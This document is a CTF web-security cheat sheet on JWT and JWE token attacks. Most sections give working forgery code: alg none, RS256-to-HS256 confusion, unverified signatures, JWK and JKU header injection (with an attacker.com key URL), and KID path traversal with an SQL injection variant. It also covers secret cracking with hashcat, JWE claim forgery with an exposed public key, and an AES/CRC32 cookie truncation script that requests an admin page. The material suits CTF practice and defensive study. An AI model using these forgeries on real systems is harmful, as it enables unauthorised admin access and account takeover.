# CTF Web - JWT & JWE Token Attacks

## Table of Contents
- [Algorithm None](#algorithm-none)
- [Algorithm Confusion (RS256 to HS256)](#algorithm-confusion-rs256-to-hs256)
- [Weak Secret Brute-Force](#weak-secret-brute-force)
- [Unverified Signature (Crypto-Cat)](#unverified-signature-crypto-cat)
- [JWK Header Injection (Crypto-Cat)](#jwk-header-injection-crypto-cat)
- [JKU Header Injection (Crypto-Cat)](#jku-header-injection-crypto-cat)
- [KID Path Traversal (Crypto-Cat)](#kid-path-traversal-crypto-cat)
- [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
- [JWE Token Forgery with Exposed Public Key (UTCTF 2026)](#jwe-token-forgery-with-exposed-public-key-utctf-2026)
- [AES Cookie Length-Field Truncation + CRC32 Swap (DefCamp 2018)](#aes-cookie-length-field-truncation--crc32-swap-defcamp-2018)

For general auth bypass, access control, and session attacks, see [auth-and-access.md](auth-and-access.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).

---

## Algorithm None
Remove signature, set `"alg": "none"` in header.

## Algorithm Confusion (RS256 to HS256)
App accepts both RS256 and HS256, uses public key for both:
```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

## Weak Secret Brute-Force
```bash
flask-unsign --decode --cookie "eyJ..."
hashcat -m 16500 jwt.txt wordlist.txt
```

## Unverified Signature (Crypto-Cat)
Server decodes JWT without verifying the signature. Modify payload claims and re-encode with the original (unchecked) signature:
```python
import jwt, base64, json

token = "eyJ..."
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['sub'] = 'administrator'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{parts[0]}.{new_payload}.{parts[2]}"
```
**Key insight:** Some JWT libraries have separate `decode()` (no verification) and `verify()` functions. If the server uses `decode()` only, the signature is never checked.

## JWK Header Injection (Crypto-Cat)
Server accepts JWK (JSON Web Key) embedded in JWT header without validation. Sign with attacker-generated RSA key, embed matching public key:
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64

private_key = rsa.generate_private_key(65537, 2048, default_backend())
public_numbers = private_key.public_key().public_numbers()

jwk = {
    "kty": "RSA",
    "kid": original_header['kid'],
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
}
forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
```
**Key insight:** Server extracts the public key from the token itself instead of using a stored key. Attacker controls both the key and the signature.

## JKU Header Injection (Crypto-Cat)
Server fetches public key from URL specified in JKU (JSON Key URL) header without URL validation:
```python
# 1. Host JWKS at attacker-controlled URL
jwks = {"keys": [attacker_jwk]}  # POST to webhook.site or attacker server

# 2. Forge token pointing to attacker JWKS
forged = jwt.encode(
    {"sub": "administrator"},
    attacker_private_key,
    algorithm='RS256',
    headers={'jku': 'https://attacker.com/.well-known/jwks.json'}
)
```
**Key insight:** Combines SSRF with token forgery. Server makes an outbound request to fetch the key, trusting whatever URL the token specifies.

## KID Path Traversal (Crypto-Cat)
KID (Key ID) header used in file path construction for key lookup. Point to predictable file:
```python
# /dev/null returns empty bytes -> HMAC key is empty string
forged = jwt.encode(
    {"sub": "administrator"},
    '',  # Empty string as secret
    algorithm='HS256',
    headers={"kid": "../../../dev/null"}
)
```
**Variants:**
- `../../../dev/null` → empty key
- `../../../proc/sys/kernel/hostname` → predictable key content
- SQL injection in KID: `' UNION SELECT 'known-secret' --` (if KID queries a database)

**Key insight:** KID is meant to select which key to use for verification. When used in file paths or SQL queries without sanitization, it becomes an injection vector.

## JWT Balance Replay (MetaShop Pattern)
1. Sign up → get JWT with balance=$100 (save this JWT)
2. Buy items → balance drops to $0
3. Replace cookie with saved JWT (balance back to $100)
4. Return all items → server adds prices to JWT's $100 balance
5. Repeat until balance exceeds target price

**Key insight:** Server trusts the balance in the JWT for return calculations but doesn't cross-check purchase history.

## JWE Token Forgery with Exposed Public Key (UTCTF 2026)

**Pattern (Break the Bank):** Application uses JWE (JSON Web Encryption) tokens instead of JWT. Public RSA key is exposed (e.g., via `/api/key`, `.well-known/jwks.json`, or in page source). Server decrypts JWE tokens with its private key — attacker encrypts forged claims with the public key.

**Key difference from JWT:** JWE tokens are **encrypted** (confidential), not just signed. The server decrypts them. If you have the public key, you can encrypt arbitrary claims that the server will trust.

```python
from jwcrypto import jwk, jwe
import json

# 1. Fetch the server's public key
# GET /api/key or extract from JWKS endpoint
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkq...
-----END PUBLIC KEY-----"""

# 2. Create JWK from public key
key = jwk.JWK.from_pem(public_key_pem.encode())

# 3. Forge claims (e.g., set balance to 999999)
forged_claims = {
    "sub": "attacker",
    "balance": 999999,
    "role": "admin"
}

# 4. Encrypt with server's public key
token = jwe.JWE(
    json.dumps(forged_claims).encode(),
    recipient=key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",  # or RSA-OAEP, RSA1_5
        "enc": "A256GCM"         # or A128CBC-HS256
    })
)
forged_jwe = token.serialize(compact=True)
# 5. Send forged token as cookie/header
```

**Detection:** Token has 5 base64url segments separated by dots (JWE compact format: header.enckey.iv.ciphertext.tag) vs. JWT's 3 segments. Endpoints that expose RSA public keys.

**Key insight:** JWE encryption ≠ authentication. If the server trusts any token it can decrypt without additional signature verification, exposing the public key lets you forge arbitrary claims. Look for public key endpoints and try encrypting modified payloads.

---

## AES Cookie Length-Field Truncation + CRC32 Swap (DefCamp 2018)

**Pattern:** A session cookie has the shape `AES(key¡value÷...¡)+<len>+<CRC32>`. The application parses the decrypted blob up to `<len>` bytes and trusts a CRC32 checksum for integrity. During registration the attacker controls the plaintext: embed `id¡1¡` early in the username, shorten `<len>` to truncate at that point, and recompute the CRC32 over the shortened payload. The deserializer now sees `id=1` (admin) and the CRC32 check still passes because CRC32 is not a MAC.

```python
import struct, zlib, requests, base64

# 1. Register with a username that embeds the target field early.
#    The challenge stores fields as key\xa1value\xf7, AES-encrypts them,
#    then appends a 2-byte length and a 4-byte CRC32.
payload_fields = b"name\xa1attacker\xf7id\xa11\xf7role\xa1user\xf7"
# 2. Grab the encrypted cookie the server set.
sess = requests.Session()
sess.post("http://target/register",
          data={"user": "attacker", "pass": "x", "payload": payload_fields})
cookie = base64.b64decode(sess.cookies["session"])
ct, rest = cookie[:-6], cookie[-6:]          # split off length + CRC32
# 3. Truncate: keep only bytes up to and including "id\xa11\xf7"
truncated_plain = b"name\xa1attacker\xf7id\xa11\xf7"
new_len = struct.pack("<H", len(truncated_plain))
new_crc = struct.pack("<I", zlib.crc32(ct[: len(truncated_plain)]))
forged = base64.b64encode(ct[: len(truncated_plain)] + new_len + new_crc)
sess.cookies["session"] = forged.decode()
print(sess.get("http://target/admin").text)
```

**Key insight:** CRC32 is a checksum, not a message authentication code — it is linear, so flipping any bit in the ciphertext and recomputing the CRC yields a still-"valid" cookie. Combined with a length field that tells the parser how many bytes to decode, the attacker can truncate (or extend) the plaintext at any point. Audit cookies that decrypt to a length-prefixed payload and watch for the signature algorithm: if it is `crc32`, `adler32`, `md5`, or anything that is not an HMAC/AEAD, assume forgery.

**References:** DefCamp CTF Qualification 2018 — Get Admin, writeup 11430
